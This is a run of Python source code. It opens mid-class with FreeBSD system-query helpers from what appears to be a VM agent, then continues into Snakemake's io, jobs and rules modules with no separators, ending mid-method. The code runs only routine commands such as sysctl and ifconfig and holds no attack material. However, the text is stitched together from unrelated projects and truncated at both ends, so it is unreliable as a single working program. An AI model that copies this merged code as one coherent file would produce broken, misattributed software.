        except ValueError:
            raise OSUtilError("Failed to get total memory: {0}".format(output))

    def get_processor_cores(self):
        ret, output = shellutil.run_get_output("sysctl hw.ncpu |awk '{print $2}'")
        if ret:
            raise OSUtilError("Failed to get processor cores.")

        try:
            return int(output)
        except ValueError:
            raise OSUtilError("Failed to get total memory: {0}".format(output))

    def set_scsi_disks_timeout(self, timeout):
        if self._scsi_disks_timeout_set:
            return

        ret, output = shellutil.run_get_output('sysctl kern.cam.da.default_timeout={0}'.format(timeout))
        if ret:
            raise OSUtilError("Failed set SCSI disks timeout: {0}".format(output))
        self._scsi_disks_timeout_set = True

    def check_pid_alive(self, pid):
        return shellutil.run('ps -p {0}'.format(pid), chk_err=False) == 0

    @staticmethod
    def _get_net_info():
        """
        There is no SIOCGIFCONF
        on freeBSD - just parse ifconfig.
        Returns strings: iface, inet4_addr, and mac
        or 'None,None,None' if unable to parse.
        We will sleep and retry as the network must be up.
        """
        iface = ''
        inet = ''
        mac = ''

        err, output = shellutil.run_get_output('ifconfig -l ether', chk_err=False)
        if err:
            raise OSUtilError("Can't find ether interface:{0}".format(output))
        ifaces = output.split()
        if not ifaces:
            raise OSUtilError("Can't find ether interface.")
        iface = ifaces[0]

        err, output = shellutil.run_get_output('ifconfig ' + iface, chk_err=False)
        if err:
            raise OSUtilError("Can't get info for interface:{0}".format(iface))

        for line in output.split('\n'):
            if line.find('inet ') != -1:
                inet = line.split()[1]
            elif line.find('ether ') != -1:
                mac = line.split()[1]
        logger.verbose("Interface info: ({0},{1},{2})", iface, inet, mac)

        return iface, inet, mac

    def device_for_ide_port(self, port_id):
        """
        Return device name attached to ide port 'n'.
        """
        if port_id > 3:
            return None
        g0 = "00000000"
        if port_id > 1:
            g0 = "00000001"
            port_id = port_id - 2
        err, output = shellutil.run_get_output('sysctl dev.storvsc | grep pnpinfo | grep deviceid=')
        if err:
            return None
        g1 = "000" + ustr(port_id)
        g0g1 = "{0}-{1}".format(g0, g1)
        """
        search 'X' from 'dev.storvsc.X.%pnpinfo: classid=32412632-86cb-44a2-9b5c-50d1417354f5 deviceid=00000000-0001-8899-0000-000000000000'
        """
        cmd_search_ide = "sysctl dev.storvsc | grep pnpinfo | grep deviceid={0}".format(g0g1)
        err, output = shellutil.run_get_output(cmd_search_ide)
        if err:
            return None
        cmd_extract_id = cmd_search_ide + "|awk -F . '{print $3}'"
        err, output = shellutil.run_get_output(cmd_extract_id)
        """
        try to search 'blkvscX' and 'storvscX' to find device name
        """
        output = output.rstrip()
        cmd_search_blkvsc = "camcontrol devlist -b | grep blkvsc{0} | awk '{{print $1}}'".format(output)
        err, output = shellutil.run_get_output(cmd_search_blkvsc)
        if err == 0:
            output = output.rstrip()
            cmd_search_dev="camcontrol devlist | grep {0} | awk -F \( '{{print $2}}'|sed -e 's/.*(//'| sed -e 's/).*//'".format(output)
            err, output = shellutil.run_get_output(cmd_search_dev)
            if err == 0:
                for possible in output.rstrip().split(','):
                    if not possible.startswith('pass'):
                        return possible

        cmd_search_storvsc = "camcontrol devlist -b | grep storvsc{0} | awk '{{print $1}}'".format(output)
        err, output = shellutil.run_get_output(cmd_search_storvsc)
        if err == 0:
            output = output.rstrip()
            cmd_search_dev="camcontrol devlist | grep {0} | awk -F \( '{{print $2}}'|sed -e 's/.*(//'| sed -e 's/).*//'".format(output)
            err, output = shellutil.run_get_output(cmd_search_dev)
            if err == 0:
                for possible in output.rstrip().split(','):
                    if not possible.startswith('pass'):
                        return possible
        return None

    @staticmethod
    def get_total_cpu_ticks_since_boot():
        return 0






__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import stat
import time
import json
from itertools import product, chain
from collections import Iterable, namedtuple
from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError                    
from snakemake.logging import logger


def lstat(f):
    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)


def lutime(f, times):
    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)


def lchmod(f, mode):
    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)


def IOFile(file, rule=None):
    f = _IOFile(file)
    f.rule = rule
    return f


class _IOFile(str):
    """
    A file that is either input or output of a rule.
    """

    dynamic_fill = "__snakemake_dynamic__"

    def __new__(cls, file):
        obj = str.__new__(cls, file)
        obj._is_function = type(file).__name__ == "function"
        obj._file = file
        obj.rule = None
        obj._regex = None
        return obj

    @property
    def file(self):
        if not self._is_function:
            return self._file
        else:
            raise ValueError("This IOFile is specified as a function and "
                             "may not be used directly.")

    @property
    def exists(self):
        return os.path.exists(self.file)

    @property
    def protected(self):                    
        return self.exists and not os.access(self.file, os.W_OK)                    

    @property
    def mtime(self):
        # do not follow symlinks for modification time
        return lstat(self.file).st_mtime

    @property
    def size(self):
        # follow symlinks but throw error if invalid
        self.check_broken_symlink()
        return os.path.getsize(self.file)

    def check_broken_symlink(self):
        """ Raise WorkflowError if file is a broken symlink. """
        if not self.exists and lstat(self.file):                    
            raise WorkflowError("File {} seems to be a broken symlink.".format(self.file))

    def is_newer(self, time):
        return self.mtime > time

    def prepare(self):
        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]
        dir = os.path.dirname(path_until_wildcard)
        if len(dir) > 0 and not os.path.exists(dir):
            try:
                os.makedirs(dir)
            except OSError as e:
                # ignore Errno 17 "File exists" (reason: multiprocessing)
                if e.errno != 17:
                    raise e

    def protect(self):
        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~
                stat.S_IWOTH)
        if os.path.isdir(self.file):
            for root, dirs, files in os.walk(self.file):
                for d in dirs:
                    lchmod(os.path.join(self.file, d), mode)
                for f in files:
                    lchmod(os.path.join(self.file, f), mode)
        else:
            lchmod(self.file, mode)

    def remove(self):
        remove(self.file)

    def touch(self):                    
        try:
            lutime(self.file, None)                    
        except OSError as e:
            if e.errno == 2:
                raise MissingOutputException(
                    "Output file {} of rule {} shall be touched but "
                    "does not exist.".format(self.file, self.rule.name),
                    lineno=self.rule.lineno,
                    snakefile=self.rule.snakefile)
            else:
                raise e

    def touch_or_create(self):
        try:
            self.touch()
        except MissingOutputException:
            # create empty file
            with open(self.file, "w") as f:
                pass

    def apply_wildcards(self, wildcards,
                        fill_missing=False,
                        fail_dynamic=False):
        f = self._file
        if self._is_function:
            f = self._file(Namedlist(fromdict=wildcards))

        return IOFile(apply_wildcards(f, wildcards,                    
                                      fill_missing=fill_missing,
                                      fail_dynamic=fail_dynamic,
                                      dynamic_fill=self.dynamic_fill),
                      rule=self.rule)                    

    def get_wildcard_names(self):
        return get_wildcard_names(self.file)

    def contains_wildcard(self):
        return contains_wildcard(self.file)

    def regex(self):
        if self._regex is None:
            # compile a regular expression
            self._regex = re.compile(regex(self.file))
        return self._regex

    def constant_prefix(self):
        first_wildcard = _wildcard_regex.search(self.file)
        if first_wildcard:
            return self.file[:first_wildcard.start()]
        return self.file

    def match(self, target):
        return self.regex().match(target) or None

    def format_dynamic(self):
        return self.replace(self.dynamic_fill, "{*}")

    def __eq__(self, other):
        f = other._file if isinstance(other, _IOFile) else other
        return self._file == f

    def __hash__(self):
        return self._file.__hash__()


_wildcard_regex = re.compile(
    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>([^\{\}]+|\{\d+(,\d+)?\})*))?\s*\}")

#    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>[^\}]*))?\s*\}")


def wait_for_files(files, latency_wait=3):
    """Wait for given files to be present in filesystem."""
    files = list(files)
    get_missing = lambda: [f for f in files if not os.path.exists(f)]
    missing = get_missing()
    if missing:
        logger.info("Waiting at most {} seconds for missing files.".format(
            latency_wait))
        for _ in range(latency_wait):
            if not get_missing():
                return
            time.sleep(1)
        raise IOError("Missing files after {} seconds:\n{}".format(
            latency_wait, "\n".join(get_missing())))


def get_wildcard_names(pattern):
    return set(match.group('name')
               for match in _wildcard_regex.finditer(pattern))


def contains_wildcard(path):
    return _wildcard_regex.search(path) is not None


def remove(file):
    if os.path.exists(file):
        if os.path.isdir(file):
            try:
                os.removedirs(file)
            except OSError:
                # ignore non empty directories
                pass
        else:
            os.remove(file)


def regex(filepattern):
    f = []
    last = 0
    wildcards = set()
    for match in _wildcard_regex.finditer(filepattern):
        f.append(re.escape(filepattern[last:match.start()]))
        wildcard = match.group("name")
        if wildcard in wildcards:
            if match.group("constraint"):
                raise ValueError(
                    "If multiple wildcards of the same name "
                    "appear in a string, eventual constraints have to be defined "
                    "at the first occurence and will be inherited by the others.")
            f.append("(?P={})".format(wildcard))
        else:
            wildcards.add(wildcard)
            f.append("(?P<{}>{})".format(wildcard, match.group("constraint") if
                                         match.group("constraint") else ".+"))
        last = match.end()
    f.append(re.escape(filepattern[last:]))
    f.append("$")  # ensure that the match spans the whole file
    return "".join(f)


def apply_wildcards(pattern, wildcards,
                    fill_missing=False,
                    fail_dynamic=False,
                    dynamic_fill=None,
                    keep_dynamic=False):
    def format_match(match):
        name = match.group("name")
        try:
            value = wildcards[name]
            if fail_dynamic and value == dynamic_fill:
                raise WildcardError(name)
            return str(value)  # convert anything into a str
        except KeyError as ex:
            if keep_dynamic:
                return "{{{}}}".format(name)
            elif fill_missing:
                return dynamic_fill
            else:
                raise WildcardError(str(ex))

    return re.sub(_wildcard_regex, format_match, pattern)


def not_iterable(value):
    return isinstance(value, str) or not isinstance(value, Iterable)


class AnnotatedString(str):
    def __init__(self, value):
        self.flags = dict()


def flag(value, flag_type, flag_value=True):
    if isinstance(value, AnnotatedString):
        value.flags[flag_type] = flag_value
        return value
    if not_iterable(value):
        value = AnnotatedString(value)
        value.flags[flag_type] = flag_value
        return value
    return [flag(v, flag_type, flag_value=flag_value) for v in value]


def is_flagged(value, flag):
    if isinstance(value, AnnotatedString):
        return flag in value.flags                    
    return False


def temp(value):
    """
    A flag for an input or output file that shall be removed after usage.
    """
    if is_flagged(value, "protected"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "temp")


def temporary(value):
    """ An alias for temp. """
    return temp(value)


def protected(value):
    """ A flag for a file that shall be write protected after creation. """
    if is_flagged(value, "temp"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "protected")


def dynamic(value):
    """
    A flag for a file that shall be dynamic, i.e. the multiplicity
    (and wildcard values) will be expanded after a certain
    rule has been run """
    annotated = flag(value, "dynamic")                    
    tocheck = [annotated] if not_iterable(annotated) else annotated
    for file in tocheck:
        matches = list(_wildcard_regex.finditer(file))
        #if len(matches) != 1:
        #    raise SyntaxError("Dynamic files need exactly one wildcard.")
        for match in matches:
            if match.group("constraint"):
                raise SyntaxError(
                    "The wildcards in dynamic files cannot be constrained.")
    return annotated


def touch(value):
    return flag(value, "touch")


def expand(*args, **wildcards):
    """
    Expand wildcards in given filepatterns.

    Arguments
    *args -- first arg: filepatterns as list or one single filepattern,
        second arg (optional): a function to combine wildcard values
        (itertools.product per default)
    **wildcards -- the wildcards as keyword arguments
        with their values as lists
    """
    filepatterns = args[0]
    if len(args) == 1:
        combinator = product
    elif len(args) == 2:
        combinator = args[1]
    if isinstance(filepatterns, str):
        filepatterns = [filepatterns]

    def flatten(wildcards):
        for wildcard, values in wildcards.items():
            if isinstance(values, str) or not isinstance(values, Iterable):
                values = [values]
            yield [(wildcard, value) for value in values]

    try:
        return [filepattern.format(**comb)
                for comb in map(dict, combinator(*flatten(wildcards))) for
                filepattern in filepatterns]
    except KeyError as e:
        raise WildcardError("No values given for wildcard {}.".format(e))


def limit(pattern, **wildcards):
    """
    Limit wildcards to the given values.

    Arguments:
    **wildcards -- the wildcards as keyword arguments
                   with their values as lists
    """
    return pattern.format(**{
        wildcard: "{{{},{}}}".format(wildcard, "|".join(values))
        for wildcard, values in wildcards.items()
    })


def glob_wildcards(pattern):
    """
    Glob the values of the wildcards by matching the given pattern to the filesystem.
    Returns a named tuple with a list of values for each wildcard.
    """
    pattern = os.path.normpath(pattern)
    first_wildcard = re.search("{[^{]", pattern)
    dirname = os.path.dirname(pattern[:first_wildcard.start(
    )]) if first_wildcard else os.path.dirname(pattern)
    if not dirname:
        dirname = "."

    names = [match.group('name')
             for match in _wildcard_regex.finditer(pattern)]
    Wildcards = namedtuple("Wildcards", names)
    wildcards = Wildcards(*[list() for name in names])

    pattern = re.compile(regex(pattern))
    for dirpath, dirnames, filenames in os.walk(dirname):
        for f in chain(filenames, dirnames):
            if dirpath != ".":
                f = os.path.join(dirpath, f)
            match = re.match(pattern, f)
            if match:
                for name, value in match.groupdict().items():
                    getattr(wildcards, name).append(value)
    return wildcards


# TODO rewrite Namedlist!
class Namedlist(list):
    """
    A list that additionally provides functions to name items. Further,
    it is hashable, however the hash does not consider the item names.
    """

    def __init__(self, toclone=None, fromdict=None, plainstr=False):
        """
        Create the object.

        Arguments
        toclone  -- another Namedlist that shall be cloned
        fromdict -- a dict that shall be converted to a
            Namedlist (keys become names)
        """
        list.__init__(self)
        self._names = dict()

        if toclone:
            self.extend(map(str, toclone) if plainstr else toclone)
            if isinstance(toclone, Namedlist):
                self.take_names(toclone.get_names())
        if fromdict:
            for key, item in fromdict.items():
                self.append(item)
                self.add_name(key)

    def add_name(self, name):
        """
        Add a name to the last item.

        Arguments
        name -- a name
        """
        self.set_name(name, len(self) - 1)

    def set_name(self, name, index, end=None):
        """
        Set the name of an item.

        Arguments
        name  -- a name
        index -- the item index
        """
        self._names[name] = (index, end)
        if end is None:
            setattr(self, name, self[index])
        else:
            setattr(self, name, Namedlist(toclone=self[index:end]))

    def get_names(self):
        """
        Get the defined names as (name, index) pairs.
        """
        for name, index in self._names.items():
            yield name, index

    def take_names(self, names):
        """
        Take over the given names.

        Arguments
        names -- the given names as (name, index) pairs
        """
        for name, (i, j) in names:
            self.set_name(name, i, end=j)

    def items(self):
        for name in self._names:
            yield name, getattr(self, name)

    def allitems(self):
        next = 0
        for name, index in sorted(self._names.items(),
                                  key=lambda item: item[1][0]):
            start, end = index
            if end is None:
                end = start + 1
            if start > next:
                for item in self[next:start]:
                    yield None, item
            yield name, getattr(self, name)
            next = end
        for item in self[next:]:
            yield None, item

    def insert_items(self, index, items):
        self[index:index + 1] = items
        add = len(items) - 1
        for name, (i, j) in self._names.items():
            if i > index:
                self._names[name] = (i + add, j + add)
            elif i == index:
                self.set_name(name, i, end=i + len(items))

    def keys(self):
        return self._names

    def plainstrings(self):
        return self.__class__.__call__(toclone=self, plainstr=True)

    def __getitem__(self, key):
        try:
            return super().__getitem__(key)
        except TypeError:
            pass
        return getattr(self, key)

    def __hash__(self):
        return hash(tuple(self))

    def __str__(self):
        return " ".join(map(str, self))


class InputFiles(Namedlist):
    pass


class OutputFiles(Namedlist):
    pass


class Wildcards(Namedlist):
    pass


class Params(Namedlist):
    pass


class Resources(Namedlist):
    pass


class Log(Namedlist):
    pass


def _load_configfile(configpath):
    "Tries to load a configfile first as JSON, then as YAML, into a dict."
    try:
        with open(configpath) as f:
            try:
                return json.load(f)
            except ValueError:
                f.seek(0)  # try again
            try:
                import yaml
            except ImportError:
                raise WorkflowError("Config file is not valid JSON and PyYAML "
                                    "has not been installed. Please install "
                                    "PyYAML to use YAML config files.")
            try:
                return yaml.load(f)
            except yaml.YAMLError:
                raise WorkflowError("Config file is not valid JSON or YAML.")
    except FileNotFoundError:
        raise WorkflowError("Config file {} not found.".format(configpath))


def load_configfile(configpath):
    "Loads a JSON or YAML configfile as a dict, then checks that it's a dict."
    config = _load_configfile(configpath)
    if not isinstance(config, dict):
        raise WorkflowError("Config file must be given as JSON or YAML "
                            "with keys at top level.")
    return config

##### Wildcard pumping detection #####


class PeriodicityDetector:
    def __init__(self, min_repeat=50, max_repeat=100):
        """
        Args:
            max_len (int): The maximum length of the periodic substring.
        """
        self.regex = re.compile(
            "((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$".format(
                min_repeat=min_repeat - 1,
                max_repeat=max_repeat - 1))

    def is_periodic(self, value):
        """Returns the periodic substring or None if not periodic."""
        m = self.regex.search(value)  # search for a periodic suffix.
        if m is not None:
            return m.group("value")

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import sys
import base64
import json

from collections import defaultdict
from itertools import chain
from functools import partial
from operator import attrgetter

from snakemake.io import IOFile, Wildcards, Resources, _IOFile                    
from snakemake.utils import format, listfiles
from snakemake.exceptions import RuleException, ProtectedOutputException
from snakemake.exceptions import UnexpectedOutputException
from snakemake.logging import logger


def jobfiles(jobs, type):
    return chain(*map(attrgetter(type), jobs))


class Job:
    HIGHEST_PRIORITY = sys.maxsize

    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):
        self.rule = rule
        self.dag = dag
        self.targetfile = targetfile

        self.wildcards_dict = self.rule.get_wildcards(targetfile)
        self.wildcards = Wildcards(fromdict=self.wildcards_dict)
        self._format_wildcards = (self.wildcards if format_wildcards is None
                                  else Wildcards(fromdict=format_wildcards))

        (self.input, self.output, self.params, self.log, self.benchmark,
         self.ruleio,
         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)

        self.resources_dict = {
            name: min(self.rule.workflow.global_resources.get(name, res), res)
            for name, res in rule.resources.items()
        }
        self.threads = self.resources_dict["_cores"]
        self.resources = Resources(fromdict=self.resources_dict)
        self._inputsize = None

        self.dynamic_output, self.dynamic_input = set(), set()
        self.temp_output, self.protected_output = set(), set()
        self.touch_output = set()
        self.subworkflow_input = dict()
        for f in self.output:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_output:
                self.dynamic_output.add(f)
            if f_ in self.rule.temp_output:
                self.temp_output.add(f)
            if f_ in self.rule.protected_output:
                self.protected_output.add(f)
            if f_ in self.rule.touch_output:
                self.touch_output.add(f)
        for f in self.input:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_input:
                self.dynamic_input.add(f)
            if f_ in self.rule.subworkflow_input:
                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]
        self._hash = self.rule.__hash__()
        if True or not self.dynamic_output:
            for o in self.output:
                self._hash ^= o.__hash__()

    @property
    def priority(self):
        return self.dag.priority(self)

    @property
    def b64id(self):
        return base64.b64encode((self.rule.name + "".join(self.output)
                                 ).encode("utf-8")).decode("utf-8")

    @property
    def inputsize(self):
        """
        Return the size of the input files.
        Input files need to be present.
        """
        if self._inputsize is None:
            self._inputsize = sum(f.size for f in self.input)
        return self._inputsize

    @property
    def message(self):
        """ Return the message for this job. """
        try:
            return (self.format_wildcards(self.rule.message) if
                    self.rule.message else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable in message "
                                "of shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def shellcmd(self):
        """ Return the shell command. """
        try:
            return (self.format_wildcards(self.rule.shellcmd) if
                    self.rule.shellcmd else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable when printing "
                                "shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def expanded_output(self):
        """ Iterate over output files while dynamic output is expanded. """
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                expansion = self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill)
                if not expansion:
                    yield f_
                for f, _ in expansion:
                    yield IOFile(f, self.rule)                    
            else:
                yield f

    @property
    def dynamic_wildcards(self):
        """ Return all wildcard values determined from dynamic output. """
        combinations = set()
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                for f, w in self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill):
                    combinations.add(tuple(w.items()))
        wildcards = defaultdict(list)
        for combination in combinations:
            for name, value in combination:
                wildcards[name].append(value)
        return wildcards

    @property
    def missing_input(self):
        """ Return missing input files. """
        # omit file if it comes from a subworkflow
        return set(f for f in self.input
                   if not f.exists and not f in self.subworkflow_input)

    @property
    def output_mintime(self):
        """ Return oldest output file. """
        existing = [f.mtime for f in self.expanded_output if f.exists]
        if self.benchmark and self.benchmark.exists:
            existing.append(self.benchmark.mtime)
        if existing:
            return min(existing)
        return None

    @property
    def input_maxtime(self):
        """ Return newest input file. """
        existing = [f.mtime for f in self.input if f.exists]
        if existing:
            return max(existing)
        return None

    def missing_output(self, requested=None):
        """ Return missing output files. """
        files = set()
        if self.benchmark and (requested is None or
                               self.benchmark in requested):
            if not self.benchmark.exists:
                files.add(self.benchmark)

        for f, f_ in zip(self.output, self.rule.output):
            if requested is None or f in requested:
                if f in self.dynamic_output:
                    if not self.expand_dynamic(
                        f_,
                        restriction=self.wildcards,
                        omit_value=_IOFile.dynamic_fill):
                        files.add("{} (dynamic)".format(f_))
                elif not f.exists:
                    files.add(f)
        return files

    @property
    def existing_output(self):
        return filter(lambda f: f.exists, self.expanded_output)

    def check_protected_output(self):
        protected = list(filter(lambda f: f.protected, self.expanded_output))
        if protected:
            raise ProtectedOutputException(self.rule, protected)

    def prepare(self):
        """
        Prepare execution of job.
        This includes creation of directories and deletion of previously
        created dynamic files.
        """

        self.check_protected_output()

        unexpected_output = self.dag.reason(self).missing_output.intersection(
            self.existing_output)
        if unexpected_output:
            logger.warning(
                "Warning: the following output files of rule {} were not "
                "present when the DAG was created:\n{}".format(
                    self.rule, unexpected_output))

        if self.dynamic_output:
            for f, _ in chain(*map(partial(self.expand_dynamic,
                                           restriction=self.wildcards,
                                           omit_value=_IOFile.dynamic_fill),
                                   self.rule.dynamic_output)):
                os.remove(f)
        for f, f_ in zip(self.output, self.rule.output):
            f.prepare()
        for f in self.log:
            f.prepare()
        if self.benchmark:
            self.benchmark.prepare()

    def cleanup(self):
        """ Cleanup output files. """
        to_remove = [f for f in self.expanded_output if f.exists]
        if to_remove:
            logger.info("Removing output files of failed job {}"
                        " since they might be corrupted:\n{}".format(
                            self, ", ".join(to_remove)))
            for f in to_remove:
                f.remove()

    def format_wildcards(self, string, **variables):
        """ Format a string with variables from the job. """
        _variables = dict()
        _variables.update(self.rule.workflow.globals)
        _variables.update(dict(input=self.input,
                               output=self.output,
                               params=self.params,
                               wildcards=self._format_wildcards,
                               threads=self.threads,
                               resources=self.resources,
                               log=self.log,
                               version=self.rule.version,
                               rule=self.rule.name, ))
        _variables.update(variables)
        try:
            return format(string, **_variables)
        except NameError as ex:
            raise RuleException("NameError: " + str(ex), rule=self.rule)
        except IndexError as ex:
            raise RuleException("IndexError: " + str(ex), rule=self.rule)

    def properties(self, omit_resources="_cores _nodes".split()):
        resources = {
            name: res
            for name, res in self.resources.items()
            if name not in omit_resources
        }
        params = {name: value for name, value in self.params.items()}
        properties = {
            "rule": self.rule.name,
            "local": self.dag.workflow.is_local(self.rule),
            "input": self.input,
            "output": self.output,
            "params": params,
            "threads": self.threads,
            "resources": resources
        }
        return properties

    def json(self):
        return json.dumps(self.properties())

    def __repr__(self):
        return self.rule.name

    def __eq__(self, other):
        if other is None:
            return False
        return self.rule == other.rule and (
            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)

    def __lt__(self, other):
        return self.rule.__lt__(other.rule)

    def __gt__(self, other):
        return self.rule.__gt__(other.rule)

    def __hash__(self):
        return self._hash

    @staticmethod
    def expand_dynamic(pattern, restriction=None, omit_value=None):
        """ Expand dynamic files. """
        return list(listfiles(pattern,
                              restriction=restriction,
                              omit_value=omit_value))


class Reason:
    def __init__(self):
        self.updated_input = set()
        self.updated_input_run = set()
        self.missing_output = set()
        self.incomplete_output = set()
        self.forced = False
        self.noio = False
        self.nooutput = False
        self.derived = True

    def __str__(self):
        s = list()
        if self.forced:
            s.append("Forced execution")
        else:
            if self.noio:
                s.append("Rules with neither input nor "
                         "output files are always executed.")
            elif self.nooutput:
                s.append("Rules with a run or shell declaration but no output "
                         "are always executed.")
            else:
                if self.missing_output:
                    s.append("Missing output files: {}".format(
                        ", ".join(self.missing_output)))
                if self.incomplete_output:
                    s.append("Incomplete output files: {}".format(
                        ", ".join(self.incomplete_output)))
                updated_input = self.updated_input - self.updated_input_run
                if updated_input:
                    s.append("Updated input files: {}".format(
                        ", ".join(updated_input)))
                if self.updated_input_run:
                    s.append("Input files updated by another job: {}".format(
                        ", ".join(self.updated_input_run)))
        s = "; ".join(s)
        return s

    def __bool__(self):
        return bool(self.updated_input or self.missing_output or self.forced or
                    self.updated_input_run or self.noio or self.nooutput)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import sys
import inspect
import sre_constants
from collections import defaultdict

from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist
from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log
from snakemake.io import apply_wildcards, is_flagged, not_iterable
from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException


class Rule:
    def __init__(self, *args, lineno=None, snakefile=None):
        """
        Create a rule

        Arguments
        name -- the name of the rule
        """
        if len(args) == 2:
            name, workflow = args
            self.name = name
            self.workflow = workflow
            self.docstring = None
            self.message = None
            self._input = InputFiles()
            self._output = OutputFiles()
            self._params = Params()
            self.dependencies = dict()
            self.dynamic_output = set()
            self.dynamic_input = set()
            self.temp_output = set()
            self.protected_output = set()
            self.touch_output = set()
            self.subworkflow_input = dict()
            self.resources = dict(_cores=1, _nodes=1)
            self.priority = 0
            self.version = None
            self._log = Log()
            self._benchmark = None
            self.wildcard_names = set()
            self.lineno = lineno
            self.snakefile = snakefile
            self.run_func = None
            self.shellcmd = None
            self.norun = False
        elif len(args) == 1:
            other = args[0]
            self.name = other.name
            self.workflow = other.workflow
            self.docstring = other.docstring
            self.message = other.message
            self._input = InputFiles(other._input)
            self._output = OutputFiles(other._output)
            self._params = Params(other._params)
            self.dependencies = dict(other.dependencies)
            self.dynamic_output = set(other.dynamic_output)
            self.dynamic_input = set(other.dynamic_input)
            self.temp_output = set(other.temp_output)
            self.protected_output = set(other.protected_output)
            self.touch_output = set(other.touch_output)
            self.subworkflow_input = dict(other.subworkflow_input)
            self.resources = other.resources
            self.priority = other.priority
            self.version = other.version
            self._log = other._log
            self._benchmark = other._benchmark
            self.wildcard_names = set(other.wildcard_names)
            self.lineno = other.lineno
            self.snakefile = other.snakefile
            self.run_func = other.run_func
            self.shellcmd = other.shellcmd
            self.norun = other.norun

    def dynamic_branch(self, wildcards, input=True):
        def get_io(rule):
            return (rule.input, rule.dynamic_input) if input else (
                rule.output, rule.dynamic_output
            )

        io, dynamic_io = get_io(self)

        branch = Rule(self)
        io_, dynamic_io_ = get_io(branch)

        expansion = defaultdict(list)
        for i, f in enumerate(io):
            if f in dynamic_io:
                try:
                    for e in reversed(expand(f, zip, **wildcards)):
                        expansion[i].append(IOFile(e, rule=branch))                    
                except KeyError:
                    return None

        # replace the dynamic files with the expanded files
        replacements = [(i, io[i], e)
                        for i, e in reversed(list(expansion.items()))]
        for i, old, exp in replacements:
            dynamic_io_.remove(old)
            io_.insert_items(i, exp)

        if not input:
            for i, old, exp in replacements:
                if old in branch.temp_output:
                    branch.temp_output.discard(old)
                    branch.temp_output.update(exp)
                if old in branch.protected_output:
                    branch.protected_output.discard(old)
                    branch.protected_output.update(exp)
                if old in branch.touch_output:
                    branch.touch_output.discard(old)
                    branch.touch_output.update(exp)

            branch.wildcard_names.clear()
            non_dynamic_wildcards = dict((name, values[0])
                                         for name, values in wildcards.items()
                                         if len(set(values)) == 1)
            # TODO have a look into how to concretize dependencies here
            (branch._input, branch._output, branch._params, branch._log,
             branch._benchmark, _, branch.dependencies
             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)
            return branch, non_dynamic_wildcards
        return branch

    def has_wildcards(self):
        """
        Return True if rule contains wildcards.
        """
        return bool(self.wildcard_names)

    @property
    def benchmark(self):
        return self._benchmark

    @benchmark.setter
    def benchmark(self, benchmark):
        self._benchmark = IOFile(benchmark, rule=self)

    @property
    def input(self):
        return self._input

    def set_input(self, *input, **kwinput):
        """
        Add a list of input files. Recursive lists are flattened.

        Arguments
        input -- the list of input files
        """
        for item in input:
            self._set_inoutput_item(item)
        for name, item in kwinput.items():
            self._set_inoutput_item(item, name=name)

    @property
    def output(self):
        return self._output

    @property
    def products(self):
        products = list(self.output)
        if self.benchmark:
            products.append(self.benchmark)
        return products

    def set_output(self, *output, **kwoutput):
        """
        Add a list of output files. Recursive lists are flattened.

        Arguments
        output -- the list of output files
        """
        for item in output:
            self._set_inoutput_item(item, output=True)
        for name, item in kwoutput.items():
            self._set_inoutput_item(item, output=True, name=name)

        for item in self.output:
            if self.dynamic_output and item not in self.dynamic_output:
                raise SyntaxError(
                    "A rule with dynamic output may not define any "
                    "non-dynamic output files.")
            wildcards = item.get_wildcard_names()
            if self.wildcard_names:
                if self.wildcard_names != wildcards:
                    raise SyntaxError(
                        "Not all output files of rule {} "
                        "contain the same wildcards.".format(self.name))
            else:
                self.wildcard_names = wildcards

    def _set_inoutput_item(self, item, output=False, name=None):
        """
        Set an item to be input or output.

        Arguments
        item     -- the item
        inoutput -- either a Namedlist of input or output items
        name     -- an optional name for the item
        """
        inoutput = self.output if output else self.input
        if isinstance(item, str):
            # add the rule to the dependencies
            if isinstance(item, _IOFile):
                self.dependencies[item] = item.rule
            _item = IOFile(item, rule=self)
            if is_flagged(item, "temp"):
                if not output:
                    raise SyntaxError("Only output files may be temporary")
                self.temp_output.add(_item)
            if is_flagged(item, "protected"):
                if not output:
                    raise SyntaxError("Only output files may be protected")
                self.protected_output.add(_item)
